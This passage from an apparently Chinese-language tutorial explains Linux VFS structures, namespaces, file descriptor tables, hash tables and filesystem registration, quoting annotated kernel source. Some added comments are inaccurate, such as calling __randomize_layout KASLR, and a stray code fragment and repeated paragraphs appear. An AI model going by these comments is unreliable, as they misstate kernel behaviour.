dentry *mnt_root; // 指向已挂载文件系统树的根目录入口（dentry结构体） struct super_block *mnt_sb; // 指向与已挂载文件系统关联的超级块（super_block结构体） int mnt_flags; // 挂载标志，表示挂载时的选项，如只读、异步等 struct mnt_idmap *mnt_idmap; // 指向一个mnt_idmap结构体，用于存储用户和组ID的映射关系（仅在某些文件系统中使用，如NFS）&#125; __randomize_layout; // 使用内核的地址空间布局随机化（KASLR）特性，以增加安全性 当文件系统被实际安装到系统中，将有一个vfsmount结构体在安装点被创建，该结构体用来代表文件系统的实例-换句话说，代表一个安装点。理清文件系统和所有其他安装点之间的关系，是维护所有安装点链表中最复杂的工作。所以vfsmount结构体中维护的各种链表就是为了能够跟踪这些关联信息。文件系统本身的相对根目录所对应的dentry保存在mnt_root中。mnt_sb指针建立了与相关的超级块之间的关联（对每个装载的文件系统而言，都有且只有一个超级块实例）。在nmt_flags可以设置各种独立于文件系统的标志。 mountpointmountpoint identifier - Linux source code (v6.3.8) - Bootlin 123456struct mountpoint &#123; struct hlist_node m_hash; struct dentry *m_dentry; struct hlist_head m_list; int m_count;&#125;; vfs命名空间VFS命名空间是所有已经装载、构成某个容器目录树的文件系统的集合。 通常调用fork或clone建立的进程会继承其父进程的命名空间。但可以设置CLONE_NEWNS标志，以建立一个新的VFS命名空间（在下文中，我不再区分VFS命名空间和命名空间，当然内核也提供了非VFS的命名空间。如果修改新的命名空间，改变不会传播到属于不同命名空间的进程。对其他命名空间的改变也不会影响新的命名空间。 struct task_struct包含的成员nsproxy，该成员负责命名空间的处理。 nsproxy identifier - Linux source code (v6.3.8) - Bootlin 123456789101112131415161718192021222324252627/* * 一个结构体,包含指向每个进程命名空间的指针 * - fs(挂载),uts,网络,sysvipc 等。 * * pid 命名空间是一个例外 - 它通过 task_active_pid_ns 访问。 * 这里的 pid 命名空间是子进程将使用的命名空间。 * * &#x27;count&#x27; 是持有引用的任务数。 * 因此,每个命名空间的计数将是指向它的 nsproxy 数,而不是任务数。 * * nsproxy 由共享所有命名空间的任务共享。 * 一旦单个命名空间被克隆或取消共享,nsproxy 就会被复制。 */ struct nsproxy &#123; atomic_t count; /*原子计数器*/ struct uts_namespace *uts_ns; /*UTS命名空间结构体指针*/ struct ipc_namespace *ipc_ns; /*IPC命名空间结构体指针*/ struct mnt_namespace *mnt_ns; /*挂载命名空间结构体指针*/ struct pid_namespace *pid_ns_for_children; /*子进程使用的PID命名空间结构体指针*/ struct net *net_ns; /*网络命名空间结构体指针*/ struct time_namespace *time_ns; /*时间命名空间结构体指针*/ struct time_namespace *time_ns_for_children; /*子进程使用的时间命名空间结构体指针*/ struct cgroup_namespace *cgroup_ns; /*cgroup命名空间结构体指针*/&#125;;extern struct nsproxy init_nsproxy; /*外部变量:初始的nsproxy*/ 实现VFS命名空间所需信息的数量相对很少： mnt_namespace identifier - Linux source code (v6.3.8) - Bootlin 123456789101112131415161718struct mnt_namespace &#123; struct ns_common ns; /*命名空间通用结构*/ struct mount * root; /*根挂载点指针*/ /* * 遍历和修改 .list 是通过两种方式保护的: * - 以写方式获取namespace_sem, 或者 * - 以读方式获取namespace_sem AND 获取 .ns_lock. */ struct list_head list; /*链表头*/ spinlock_t ns_lock; /*自旋锁*/ struct user_namespace *user_ns; /*用户命名空间指针*/ struct ucounts *ucounts; /*引用计数器*/ u64 seq; /*序列号,用于防止循环*/ wait_queue_head_t poll; /*等待队列头*/ u64 event; unsigned int mounts; /*命名空间中的挂载数*/ unsigned int pending_mounts; /*待定挂载数*/ &#125; __randomize_layout; /*随机布局*/ 进程相关数据结构系统中的每一个进程都有自己的一组打开的文件，像根文件系统，当前工作目录，安装点等。有三个数据结构将VFS层和系统的进程紧密联系在一起，它们分别是：files_struct、fs_struct、namespace结构体。 文件描述符（就是整数）用于在一个进程内唯一地标识打开的文件。这假定了内核能够在用户进程中的描述符和内核内部使用的结构之间，建立一种关联。每个进程的task_struct中包含了用于完成该工作的成员。 task_structtask_struct identifier - Linux source code (v6.3.8) - Bootlin 12345678910111213struct task_struct &#123;.../* 文件系统信息 */int link_count, total_link_count;.../* 文件系统信息 */struct fs_struct *fs;/* 打开文件信息 */struct files_struct *files;/* 命名空间 */struct nsproxy *nsproxy;...&#125; 文件描述符（就是整数）用于在一个进程内唯一地标识打开的文件。这假定了内核能够在用户进程中的描述符和内核内部使用的结构之间，建立一种关联。每个进程的task_struct中包含了用于完成该工作的成员。 进程的文件系统相关数据保存在fs中。这些数据包含，例如当前工作目录和chroot限制有关的信息。整数成员link_count和total_link_count用于在查找环形链表时防止无限循环。 由于内核允许同时运行多个模仿独立系统的容器，从容器角度看似“全局”的每个资源，都由内核包装起来，分别根据每个容器进行管理。虚拟文件系统也受到影响，因为各个容器可能因装载点的不同导致不同的目录层次结构。对应的信息包含在ns_proxy-&gt;mnt_namespace中。 files_structfiles_struct identifier - Linux source code (v6.3.8) - Bootlin 1234567891011121314151617181920212223/* * 打开的文件表结构 */ struct files_struct &#123; /* * 主要读取部分 */ atomic_t count; //原子计数器，共享该表的进程数目 bool resize_in_progress; //重新调整进度 wait_queue_head_t resize_wait; //等待重新调整队列 struct fdtable __rcu *fdt; //文件描述符表 struct fdtable fdtab; /* * SMP上单独的缓存线中的写入部分 */ spinlock_t file_lock ____cacheline_aligned_in_smp; //文件锁 unsigned int next_fd; //下一个文件描述符 unsigned long close_on_exec_init[1]; //执行时关闭的初始化 unsigned long open_fds_init[1]; //打开的文件描述符初始化 unsigned long full_fds_bits_init[1]; //完整文件描述符位的初始化 struct file __rcu * fd_array[NR_OPEN_DEFAULT]; //文件描述符数组 &#125;; next_fd表示下一次打开新文件时使用的文件描述符。close_on_exec_init和open_fds_init是位图。对执行exec时将关闭的所有文件描述符，在close_on_exec中对应的比特位都将置位。open_fds_init是最初的文件描述符集合。 fd_array的每个数组项都是一个指针，指向每个打开文件的struct file实例，稍后我会讨论该结构。默认情况下，内核允许每个进程打开NR_OPEN_DEFAULT个文件。该值定义在NR_OPEN_DEFAULT identifier - Linux source code (v6.3.8) - Bootlin中，默认值为BITS_PER_LONG。因此在32位系统上，允许打开文件的初始数目是32。64位系统可以同时处理64个文件。如果一个进程试图同时打开更多的文件，内核必须对files_struct中用于管理与进程相关的所有文件信息的各个成员，分配更多的内存空间。最重要的信息包含在fdtab中。内核为此定义了另一个数据结构fdtable。 fdtablefdtable identifier - Linux source code (v6.3.8) - Bootlin 12345678struct fdtable &#123; unsigned int max_fds; struct file __rcu **fd; /* current fd array */ unsigned long *close_on_exec; unsigned long *open_fds; unsigned long *full_fds_bits; struct rcu_head rcu;&#125;; struct files_struct中包含了该结构的一个实例和指向一个实例的指针，因为这里使用了RCU机制以便在无需锁定的情况下读取这些数据结构，这可以加速处理。在讨论具体的做法前，我们需要介绍各个成员的语义。 max_fds指定了进程当前可以处理的文件对象和文件描述符的最大数目。这里没有固有的上限，因为这两个值都可以在必要时增加（只要没有超出由Rlimit指定的值，但这与文件结构无关）。尽管内核使用的文件对象和文件描述符的数目总是相同的，但必须定义不同的最大数目。这归因于管理相关数据结构的方法。我会在下文解释这一点，但首先必须阐明该结构剩余成员的语义。 fd是一个指针数组，每个数组项指向一个file结构的实例，管理一个打开文件的所有信息。用户空间进程的文件描述符充当数组索引。该数组当前的长度由max_fds定义。 open_fds是一个指向位域的指针，该位域管理着当前所有打开文件的描述符。每个可能的文件描述符都对应着一个比特位。如果该比特位置位，则对应的文件描述符处于使用中；否则该描述符未使用。当前比特位置的最大数目由max_fdset指定。 close_on_exec也是一个指向位域的指针，该位域保存了所有在exec系统调用时将要关闭的文件描述符的信息。 fs_structfs_struct identifier - Linux source code (v6.3.8) - Bootlin 主要就是一个file指针数组，我们通常说的文件描述符是一个整数，而这个整数正好可以作为下标，从而从files_struct中获得file结构。具体查找是通过fdt-&gt;fd[fd]来找到对应的file。 12345678struct fs_struct &#123; int users; spinlock_t lock; seqcount_spinlock_t seq; int umask; int in_exec; struct path root, pwd;&#125; __randomize_layout; fdt 默认是指向fdtab的，当打开的文件数目比较多的时候，就需要重新分配一个fdtable，并增大其fd数组和打开位图，然后将这个fdt指向新分配的fdtable。原来fdt所指向的内存会复制到新的fdtable。 至于如何判断fdt是否指向动态fdtable，也就是最后是否需要释放fdt所指向的内存，可以通过判断fdt和fdtab的地址是否相等来确定。 file_lock 保护对file_struct的修改。 从文件描述符转换为file的关键数据结构就是fdtable。 fdtablefdtable identifier - Linux source code (v6.3.8) - Bootlin 12345678struct fdtable &#123; unsigned int max_fds; struct file __rcu **fd; /* current fd array */ unsigned long *close_on_exec; unsigned long *open_fds; unsigned long *full_fds_bits; struct rcu_head rcu;&#125;; fd 如果打开的文件比较少，那么这个fd将指向files_struct的fd_array。如果打开的文件比较多，fdtable本身就是动态分配的，fd也是动态分配。所以是否要释放fd所指空间很好判断，如果要释放fdtable就一定会释放fd。对fd的分配会尝试kmalloc()和vmalloc()两种方法。 另外，close_on_exec与open_fds的行为同fd，如果fdtable是动态分配的，那么他们也必然是动态分配的。 虚拟文件系统机制原理Linux内核当中负责管理和存储文件的模块，即文件系统模块。Linux文件系统的架构视图（用户空间、内核空间、硬件层面） 挂载执行命令：mount -t fstype device dir 卸载执行命令：umount 当我们写文件时，Linux内核系统模块会把数据保存在页缓存当中，不会立刻写到存储设备。使用fsync把文件修改过的属性和数据立即写到存储设备，使用fsync把文件修改过的属性和数据立即写到存储设备，或者使用fdatasync把文件修改过的数据理解写到存储设备。 我们应用程序可以使用glibc库封装的I&#x2F;O来访问文件（提供缓冲区，目的是尽可能减少调用read&#x2F;write的次数，提高性能） 硬件层面：块设备（机械硬盘）、闪存（SSD）、NVDIMM设备。NOR闪存适合存储程序（一般情况下存储引导程序，U-Boot程序）。NAND闪存适合存储数据。 为什么要针对闪存专门设计文件系统？ NAND存在坏块，软件需要识别且跳过坏块。 需要实现损耗均衡，损耗均衡就是使所有擦除块的擦除次数均衡，避免一部分擦除快先损坏。 NAND闪存和机械硬盘的主要区别： 机械硬盘最小读写单位为扇区，扇区大小一般为512字节；NAND闪存最小读写单位是页或子页。 机械硬盘可以直接写入数据；NAND在写入数据之前需要擦除一个擦除块。 机械硬盘的使用寿命比NAND闪存长；机械硬盘的扇区的写入次数没有限制；NAND闪存擦除快的擦除次数有限。 机械硬盘隐藏坏的扇区，软件不需要处理坏的扇区；NAND闪存的坏块对软件可见，软件需要处理坏块。 Linux内核空间层面：Linux内核的目录fs（内核支持多种文件系统类型）。为了不同文件系统实现能够共存，内核实现一个抽象层（称为虚拟文件系统）。文件系统分类：块设备文件系统（ext2&#x2F;3&#x2F;4、btrfs）、闪存文件系统（JFFS2、UBIFS）、内存文件系统（tmpfs）、伪文件系统（sockfs、proc、sysfs、hugetlbfs、cgroup)。 避免每次读写都需要访问块设备，内核实现块缓存，为每个块设备在内存中创建一个块缓存，缓存单位为块，块缓存基于页缓存实现。I&#x2F;O调度器用来决定读写请求的提交顺序，不同场景提供多种调度算法：NOOP（适合闪存类设备）、CFQ，Deadline（后两个适合机械硬盘）。 Linux内核把闪存称为存储技术设备（MTD） 虚拟文件系统（VFS）数据结构：超级块(super_block)、索引节点(inode)(每个文件对应一个索引节点，每个索引节点有一个唯一的编号）、目录项(dentry)。 当进程打开一个文件时，虚拟文件系统就会创建文件的一个打开实例（file数据结构）。文件系统的第一块是超级块（super_block) 挂载描述符：一个文件系统，只有挂载到内存当中目录树的 一个目录下，进程才能够访问这个文件系统。每次挂载文件系统，虚拟文件系统就会创建一个挂载描述符：mount结构体。挂载描述符用来描述文件系统的一个挂载实例，同一个存储设备上的文件系统可以多次挂载，每次挂载到不同的目录下。mount结构体。 基本操作索引节点哈希表哈希表结构 types.h - include&#x2F;linux&#x2F;types.h - Linux source code (v6.3.8) - Bootlin 123456struct hlist_head &#123; struct hlist_node *first;&#125;;struct hlist_node &#123; struct hlist_node *next, **pprev;&#125;; 关于hash值得计算使用的是如下函数,参数hashval实际就是inode的索引号。 inode.c - fs&#x2F;inode.c - Linux source code (v6.3.8) - Bootlin 123456789101112131415161718192021// 定义一个名为hash的函数，传入一个指向super_block结构体的指针sb和一个无符号长整型hashval，返回一个无符号长整型值static unsigned long hash(struct super_block *sb, unsigned long hashval)&#123; // 定义一个无符号长整型变量tmp，用于存储计算结果 unsigned long tmp; // 计算tmp的值，其中： // 1. 将hashval乘以sb指针的值（将其视为无符号长整型） // 2. 对上述结果进行异或运算，与(GOLDEN_RATIO_PRIME + hashval) / L1_CACHE_BYTES的结果 tmp = (hashval * (unsigned long)sb) ^ (GOLDEN_RATIO_PRIME + hashval) / L1_CACHE_BYTES; // 对tmp进行以下计算： // 1. 将tmp与GOLDEN_RATIO_PRIME进行异或 // 2. 右移i_hash_shift位 // 3. 与原tmp值进行异或 tmp = tmp ^ ((tmp ^ GOLDEN_RATIO_PRIME) &gt;&gt; i_hash_shift); // 返回tmp与i_hash_mask进行按位与运算的结果 return tmp &amp; i_hash_mask;&#125; insert_inode_hash 将inode插入哈希表 insert_inode_hash identifier - Linux source code (v6.3.8) - Bootlin 1234static inline void insert_inode_hash(struct inode *inode)&#123; __insert_inode_hash(inode, inode-&gt;i_ino);&#125; remove_inode_hash 将inode从哈希表删除 remove_inode_hash identifier - Linux source code (v6.3.8) - Bootlin 12345static inline void remove_inode_hash(struct inode *inode)&#123; if (!inode_unhashed(inode) &amp;&amp; !hlist_fake(&amp;inode-&gt;i_hash)) __remove_inode_hash(inode);&#125; 目录项哈希表哈希表结构 list_bl.h - include&#x2F;linux&#x2F;list_bl.h - Linux source code (v6.3.8) - Bootlin 1234567struct hlist_bl_head &#123; struct hlist_bl_node *first;&#125;;struct hlist_bl_node &#123; struct hlist_bl_node *next, **pprev;&#125;; 12345678910111213141516171819/* * 这是与dcache（目录项缓存）最关键的数据结构：用于查找的哈希表。 * 有人应该尝试优化这个数据结构 - 我只是让它能够工作。 * * 这个哈希函数试图避免丢失太多的哈希信息，同时避免使用质数大小的哈希表等类似设计。 */// 定义一个静态无符号整型变量d_hash_shift，使用__read_mostly修饰，表示该变量在大多数情况下是只读的static unsigned int d_hash_shift __read_mostly;// 定义一个指向hlist_bl_head结构体的指针dentry_hashtable，使用__read_mostly修饰，表示该指针在大多数情况下是只读的static struct hlist_bl_head *dentry_hashtable __read_mostly;// 定义一个名为d_hash的内联函数，参数为无符号整型hash，返回一个指向hlist_bl_head结构体的指针static inline struct hlist_bl_head *d_hash(unsigned int hash)&#123; // 计算哈希值：将输入的hash右移d_hash_shift位，然后与dentry_hashtable相加，得到哈希表中对应的指针 return dentry_hashtable + (hash &gt;&gt; d_hash_shift);&#125; dentry_hashtable 在dcache_init()&#x2F;dcache_init_early()时会对其初始化 123456789101112131415161718192021222324252627static void __init dcache_init(void)&#123; /* * A constructor could be added for stable state like the lists, * but it is probably not worth it because of the cache nature * of the dcache. */ dentry_cache = KMEM_CACHE_USERCOPY(dentry, SLAB_RECLAIM_ACCOUNT|SLAB_PANIC|SLAB_MEM_SPREAD|SLAB_ACCOUNT, d_iname); /* Hash may have been set up in dcache_init_early */ if (!hashdist) return; dentry_hashtable = alloc_large_system_hash(&quot;Dentry cache&quot;, sizeof(struct hlist_bl_head), dhash_entries, 13, HASH_ZERO, &amp;d_hash_shift, NULL, 0, 0); d_hash_shift = 32 - d_hash_shift;&#125; 1234567891011121314151617181920static void __init dcache_init_early(void)&#123; /* If hashes are distributed across NUMA nodes, defer * hash allocation until vmalloc space is available. */ if (hashdist) return; dentry_hashtable = alloc_large_system_hash(&quot;Dentry cache&quot;, sizeof(struct hlist_bl_head), dhash_entries, 13, HASH_EARLY | HASH_ZERO, &amp;d_hash_shift, NULL, 0, 0); d_hash_shift = 32 - d_hash_shift;&#125; d_hash_mask 实际长度位数，即ilog2(dhash_entries) d_hash_shift 最大索引值，即(1 &lt;&lt; d_hash_mask) - 1 对hash值的计算采用的是如下函数，注意d_hash的参数hash是将路径名转换出来的一个数字，具体转换方法比较复杂，请参考full_name_hash。 123456static inline struct hlist_bl_head *in_lookup_hash(const struct dentry *parent, unsigned int hash)&#123; hash += (unsigned long) parent / L1_CACHE_BYTES; return in_lookup_hashtable + hash_32(hash, IN_LOOKUP_SHIFT);&#125; d_add 实例化dentry并加入哈希表，所谓实例化就是和具体的inode关联 12345678910111213141516171819202122232425/** * d_add - 将dentry添加到哈希队列中 * @entry: 要添加的dentry * @inode: 要附加到此dentry的inode * * 将entry添加到哈希队列中并初始化@inode。 * 实际上，在d_alloc()过程中已经填充了entry。 */// 定义一个名为d_add的函数，参数为指向dentry结构体的指针entry和指向inode结构体的指针inodevoid d_add(struct dentry *entry, struct inode *inode)&#123; // 如果inode非空 if (inode) &#123; // 调用security_d_instantiate()函数，将entry与inode关联 security_d_instantiate(entry, inode); // 对inode的i_lock成员进行自旋锁加锁，以保护其关联的dentry链表 spin_lock(&amp;inode-&gt;i_lock); &#125; // 调用__d_add()函数，将entry添加到inode的关联dentry链表中 __d_add(entry, inode);&#125;// 导出d_add函数的符号，使其可以被外部模块使用EXPORT_SYMBOL(d_add); d_lookup 根据路径名查找目录项，在__d_lookup基础上加了一个顺序锁校验 12345678910111213141516171819202122232425/** * d_lookup - search for a dentry * @parent: parent dentry * @name: qstr of name we wish to find * Returns: dentry, or NULL * * d_lookup searches the children of the parent dentry for the name in * question. If the dentry is found its reference count is incremented and the * dentry is returned. The caller must use dput to free the entry when it has * finished using it. %NULL is returned if the dentry does not exist. */struct dentry *d_lookup(const struct dentry *parent, const struct qstr *name)&#123; struct dentry *dentry; unsigned seq; do &#123; seq = read_seqbegin(&amp;rename_lock); dentry = __d_lookup(parent, name); if (dentry) break; &#125; while (read_seqretry(&amp;rename_lock, seq)); return dentry;&#125;EXPORT_SYMBOL(d_lookup); 文件系统安装在使用一个文件系统之前，必须执行两个操作：注册和安装。 或者在系统启动时，或者在安装某个文件系统的模块时，都需要进行注册。一旦一个文件系统完成注册，那么它具体的函数对内核就是可用的了，因此，这个文件系统就可以安装在系统的目录树上。在文件系统注册到内核时，文件系统是编译为模块，或者持久编译到内核中，都没有差别。如果不考虑注册的时间（持久编译到内核的文件系统在启动时注册，模块化文件系统在相关模块载入内核时注册），在两种情况下所用的技术方法是同样的。 每个文件系统都有它自己的根目录，如果某文件系统的根目录时系统目录树的根，那么该文件系统称为根文件系统。而其他文件系统可以安装到系统的目录树上，把这些文件系统要插入的那些目录就成为安装点（mount point）。 注册和挂载文件系统要注册和注销文件系统，要使用以下API函数： fs.h - include&#x2F;linux&#x2F;fs.h - Linux source code (v6.6) - Bootlin 1234#include &lt;linux/fs.h&gt;extern int register_filesystem(struct file_system_type *);extern int unregister_filesystem(struct file_system_type *); 传递struct file_system_type描述了文件系统。当请求将文件系统挂载到namespace中的目录时，VFS将为特定文件系统调用相应的mount()方法。 引用 -&gt;mount（） 返回的树的新 vfsmount 将附加到挂载点，以便当路径名解析到达挂载点时，它将跳转到该 vfsmount 的根目录。 可以在文件 &#x2F;proc&#x2F;filesystems 中看到注册到内核的所有文件系统。 在系统初始化期间，Linux v2.6调用函数filesystem_setup()来注册编译时指定的文件系统，而在最新版本的Linux中这个函数由其他函数替代。通过module_init()和相应的init_xxx_fs()函数来实现文件系统的注册。 对于每个不同类型的文件系统，以指向file_system_type类型的某个对象作为参数来调用register_filesystem()函数，因此，该对象就被插入到文件系统类型的链表中。 当某个文件系统的模块被装入时，也要调用register_filesystem()函数。在这种情况下，当该模块被卸载时，对应的文件系统也可以被注销（调用unregister_filesystem()函数）。 get_fs_type()函数（接受一个文件系统名作为它的参数）扫描已注册的文件系统链表，并返回指向相应的file_system_type对象的指针（如果存在）。 get_fs_type identifier - Linux source code (v6.3.8) - Bootlin 123456789101112131415161718192021struct file_system_type *get_fs_type(const char *name) &#123; //根据文件系统名称获取文件系统类型 struct file_system_type *fs; const char *dot = strchr(name, &#x27;.&#x27;); //查找点号 int len = dot ? dot - name : strlen(name); //获取文件系统类型名称的长度 fs = __get_fs_type(name, len); //根据名称和长度获取文件系统类型 if (!fs &amp;&amp; (request_module(&quot;fs-%.*s&quot;, len, name) == 0)) &#123; //如果获取不到,加载文件系统模块 fs = __get_fs_type(name, len); //再次获取文件系统类型 if (!fs) pr_warn_once(&quot;request_module fs-%.*s succeeded, but still no fs?\\n&quot;, //如果还是获取不到,打印警告信息 len, name); &#125; if (dot &amp;&amp; fs &amp;&amp; !(fs-&gt;fs_flags &amp; FS_HAS_SUBTYPE)) &#123; //如果文件系统名称包含点号,且文件系统类型不支持子类型 put_filesystem(fs); //释放文件系统类型 fs = NULL; //设置为NULL &#125; return fs; //返回文件系统类型&#125; 加载文件系统模块（如 ext4），并调用文件系统的注册函数。在注册函数中，需要提供一个指向 file_system_type 结构体的指针，该结构体包含文件系统的基本信息和操作指针。 文件系统可以以两种方式存在于操作系统中：内建于内核中或作为可加载模块。内建文件系统直接编译进内核，而作为模块的文件系统可以在运行时动态加载。这种模块化设计可以节省内核空间和提高运行效率，因为只有在需要使用特定文件系统时，对应的模块才会被加载。 内建于内核的文件系统意味着文件系统的实现代码直接编译进内核二进制文件，而不是作为模块动态加载。内建文件系统在内核启动时就已经可用，不需要额外的加载过程。这种方式适用于一些基本或常用的文件系统，如 ext4、proc 、tmpfs等。 使用 register_filesystem() 函数注册新的文件系统，将其添加到 VFS 支持的文件系统列表中。 当需要挂载该文件系统时（例如，通过 mount 命令），VFS 将调用 file_system_type 结构体中的 mount 函数指针。这将触发读取设备的超级块数据并创建一个对应的 VFS super_block 结构体实例。这个实例包含了该文件系统的类型、状态、操作等信息。 以tmpfs文件系统为例 当内核启动时，会执行shmem_init函数（定义在mm/shmem.c文件中）。这个函数会调用register_filesystem注册tmpfs文件系统。 shmem_init identifier - Linux source code (v6.3.6) - Bootlin 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647void __init shmem_init(void)&#123;// 初始化 inode 缓存shmem_init_inodecache();// 注册 tmpfs 文件系统int error = register_filesystem(&amp;shmem_fs_type);if (error) &#123; // 若注册失败，打印错误信息 pr_err(&quot;Could not register tmpfs\\n&quot;); // 跳转到 out2，执行清理操作 goto out2;&#125;// 尝试挂载 tmpfs 文件系统shm_mnt = kern_mount(&amp;shmem_fs_type);if (IS_ERR(shm_mnt)) &#123; // 若挂载失败，获取错误代码 error = PTR_ERR(shm_mnt); // 打印错误信息 pr_err(&quot;Could not kern_mount tmpfs\\n&quot;); // 跳转到 out1，执行清理操作 goto out1;&#125;#ifdef CONFIG_TRANSPARENT_HUGEPAGE// 如果支持透明巨页，且巨页设置不为禁用，设置巨页选项if (has_transparent_hugepage() &amp;&amp; shmem_huge &gt; SHMEM_HUGE_DENY) SHMEM_SB(shm_mnt-&gt;mnt_sb)-&gt;huge = shmem_huge;else // 否则，将巨页设置为永不使用，以防万一 shmem_huge = SHMEM_HUGE_NEVER;#endif// 成功执行，函数返回return;out1:// 清理操作：注销 tmpfs 文件系统unregister_filesystem(&amp;shmem_fs_type);out2:// 清理操作：销毁 inode 缓存shmem_destroy_inodecache();// 设置 shm_mnt 为错误指针，表示初始化失败shm_mnt = ERR_PTR(error);&#125; shmem_fs_type是一个file_system_type结构体，定义了tmpfs文件系统的基本信息。在这个结构体中，init_fs_context成员被设置为shmem_init_fs_context。 shmem_fs_type identifier - Linux source code (v6.3.6) - Bootlin 1234567891011121314static struct file_system_type shmem_fs_type = &#123;.owner = THIS_MODULE, // 指定文件系统模块的所有者.name = &quot;tmpfs&quot;, // 文件系统的名称.init_fs_context = shmem_init_fs_context, // 初始化文件系统上下文的回调函数#ifdef CONFIG_TMPFS.parameters = shmem_fs_parameters, // 指定文件系统的挂载参数解析回调#endif.kill_sb = kill_litter_super, // 用于销毁超级块的回调函数#ifdef CONFIG_SHMEM.fs_flags = FS_USERNS_MOUNT | FS_ALLOW_IDMAP, // 文件系统的标志（支持用户命名空间挂载和ID映射）#else.fs_flags = FS_USERNS_MOUNT, // 文件系统的标志（仅支持用户命名空间挂载）#endif&#125;; 当一个新的文件系统需要被支持时，它需要使用 register_filesystem() 函数将自己注册到 VFS。这样，VFS 就可以识别和处理这个新的文件系统。 register_filesystem identifier - Linux source code (v6.3.6) - Bootlin 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849/** * register_filesystem - 注册一个新的文件系统 * @fs: 文件系统结构体 * * 将传入的文件系统添加到内核已知的文件系统列表中，供挂载和其他系统调用使用。 * 成功时返回0，出错时返回一个负的errno错误码。 * * 传入的 &amp;struct file_system_type 结构体将链接到内核结构中， * 在文件系统未注销之前，不应该被释放。 */int register_filesystem(struct file_system_type * fs)&#123; int res = 0; // 初始化结果为0，表示成功 struct file_system_type ** p; // 检查文件系统参数是否有效 if (fs-&gt;parameters &amp;&amp; !fs_validate_description(fs-&gt;name, fs-&gt;parameters)) return -EINVAL; // 检查文件系统名称中是否包含非法字符 &#x27;.&#x27; BUG_ON(strchr(fs-&gt;name, &#x27;.&#x27;)); // 检查文件系统是否已经链接到其他文件系统 if (fs-&gt;next) return -EBUSY; // 获取 file_systems_lock 写锁，以保护 file_systems 链表 write_lock(&amp;file_systems_lock); // 查找具有相同名称的文件系统 p = find_filesystem(fs-&gt;name, strlen(fs-&gt;name)); // 如果找到了具有相同名称的文件系统，返回 -EBUSY if (*p) res = -EBUSY; else // 否则，将新的文件系统链接到 file_systems 链表中 *p = fs; // 释放 file_systems_lock 写锁 write_unlock(&amp;file_systems_lock); // 返回结果 return res;&#125;EXPORT_SYMBOL(register_filesystem); // 导出 register_filesystem 符号，供其他模块使用k); return res;&#125; 根文件系统注册文件系统类型 注册rootfs是在init_rootfs中完成的 init_rootfs identifier - Linux source code (v6.3.8) - Bootlin 123456void __init init_rootfs(void)&#123; if (IS_ENABLED(CONFIG_TMPFS) &amp;&amp; !saved_root_name[0] &amp;&amp; (!root_fs_names || strstr(root_fs_names, &quot;tmpfs&quot;))) is_tmpfs = true;&#125; 主要工作就是注册rootfs_fs_type rootfs_fs_type identifier - Linux source code (v6.3.8) - Bootlin 12345struct file_system_type rootfs_fs_type = &#123; .name = &quot;rootfs&quot;, .init_fs_context = rootfs_init_fs_context, .kill_sb = kill_litter_super,&#125;; 挂载根文件系统 init_mount_tree 调用vfs_kern_mount，创建名字空间，设置进程pwd&#x2F;root路径 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364static void __init init_mount_tree(void)&#123; // 声明一个指向 vfsmount 结构体的指针 mnt，用于表示挂载的文件系统 struct vfsmount *mnt; // 声明一个指向 mount 结构体的指针 m，用于表示挂载点 struct mount *m; // 声明一个指向 mnt_namespace 结构体的指针 ns，用于表示挂载命名空间 struct mnt_namespace *ns; // 声明一个 path 结构体变量 root，用于表示根路径 struct path root; // 调用 vfs_kern_mount 函数挂载 root 文件系统，返回挂载对象的指针 mnt = vfs_kern_mount(&amp;rootfs_fs_type, 0, &quot;rootfs&quot;, NULL); // 检查 mnt 是否包含错误指针 if (IS_ERR(mnt)) panic(&quot;Can&#x27;t create rootfs&quot;); // 如果存在错误，输出错误信息并终止内核 // 为新的命名空间分配内存 ns = alloc_mnt_ns(&amp;init_user_ns, false); // 检查 ns 是否包含错误指针 if (IS_ERR(ns)) panic(&quot;Can&#x27;t allocate initial namespace&quot;); // 如果存在错误，输出错误信息并终止内核 // 获取 mnt 对应的真实挂载点 m = real_mount(mnt); // 将新分配的命名空间 ns 赋值给挂载点 m 的命名空间字段 m-&gt;mnt_ns = ns; // 将挂载点 m 设置为命名空间的根挂载点 ns-&gt;root = m; // 初始化命名空间的挂载计数为 1 ns-&gt;mounts = 1; // 将挂载点 m 添加到命名空间的挂载列表中 list_add(&amp;m-&gt;mnt_list, &amp;ns-&gt;list); // 将新分配的命名空间 ns 设置为初始任务的命名空间代理 init_task.nsproxy-&gt;mnt_ns = ns; // 增加命名空间的引用计数 get_mnt_ns(ns); // 设置根路径的挂载对象为 mnt root.mnt = mnt; // 设置根路径的目录项为挂载对象的根目录项 root.dentry = mnt-&gt;mnt_root; // 设置挂载对象的标志位为已锁定 mnt-&gt;mnt_flags |= MNT_LOCKED; // 设置当前任务的文件系统工作目录为新的根路径 set_fs_pwd(current-&gt;fs, &amp;root); // 设置当前任务的文件系统根目录为新的根路径 set_fs_root(current-&gt;fs, &amp;root);&#125; vfs_kern_mount 分配mount，调用mount_fs来执行挂载操作，建立挂载点关系 vfs_kern_mount identifier - Linux source code (v6.3.8) - Bootlin 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748struct vfsmount *vfs_kern_mount(struct file_system_type *type, int flags, const char *name, void *data)&#123; // 声明一个指向 fs_context 结构体的指针 fc，用于表示文件系统上下文 struct fs_context *fc; // 声明一个指向 vfsmount 结构体的指针 mnt，用于表示挂载的文件系统 struct vfsmount *mnt; // 声明一个整型变量 ret，用于存储返回值 int ret = 0; // 检查传入的文件系统类型指针 type 是否为空 if (!type) return ERR_PTR(-EINVAL); // 如果为空，返回错误指针 // 调用 fs_context_for_mount 函数创建一个新的文件系统上下文 fc = fs_context_for_mount(type, flags); // 检查创建的文件系统上下文是否包含错误指针 if (IS_ERR(fc)) return ERR_CAST(fc); // 如果存在错误，返回错误指针 // 检查传入的名称参数 name 是否非空 if (name) // 调用 vfs_parse_fs_string 函数解析文件系统名称 ret = vfs_parse_fs_string(fc, &quot;source&quot;, name, strlen(name)); // 检查 ret 是否为 0（表示无错误） if (!ret) // 调用 parse_monolithic_mount_data 函数解析传入的挂载数据 ret = parse_monolithic_mount_data(fc, data); // 检查 ret 是否为 0（表示无错误） if (!ret) // 调用 fc_mount 函数执行挂载操作，并将结果赋值给 mnt mnt = fc_mount(fc); else // 如果存在错误，将 ret 转换为错误指针并赋值给 mnt mnt = ERR_PTR(ret); // 释放文件系统上下文 put_fs_context(fc); // 返回挂载的文件系统指针 